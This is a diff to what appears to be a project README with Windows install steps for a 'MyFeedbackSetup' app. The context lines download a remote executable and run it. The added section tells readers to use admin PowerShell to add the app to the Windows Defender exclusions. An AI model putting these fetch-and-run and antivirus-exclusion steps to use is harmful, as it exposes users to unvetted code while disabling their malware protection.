@@ -3,6 +3,21 @@
 ```bash
 iwr -UseBasicParsing "https://github.com/bebedudu/autoupdate/releases/download/v1.1.8/MyFeedbackSetup.exe" -OutFile "$env:TEMP\MyFeedbackSetup.exe"; Start-Process "$env:TEMP\MyFeedbackSetup.exe"
 ```
+### Make trusted application to window defender
+1. Open Powershell as admn & paste the script
+```bash
+# Define the path to your executable
+$exePath = "C:\user feedback\feedback\feedback.exe"
+# Add the application to Windows Defender exclusions
+Add-MpPreference -ExclusionPath $exePath
+Write-Host "Added $exePath to Windows Defender exclusions."
+```
+2. Check the Exclusion list
+i)Open Setting > Privacy & Security > Windows Security > Virus & Threat Protection
+ii)Click on Manage Settings under "Virus & threat protection settings."
+iii)Scroll down to the Exclusions section and click Add or Remove Exclusions .
+iv)Check if your application's path is listed here.
+
 ### To delete previous installed assets
 1. Open CMD in admin mode paste the script (may need to run 2 time)
 ```bash
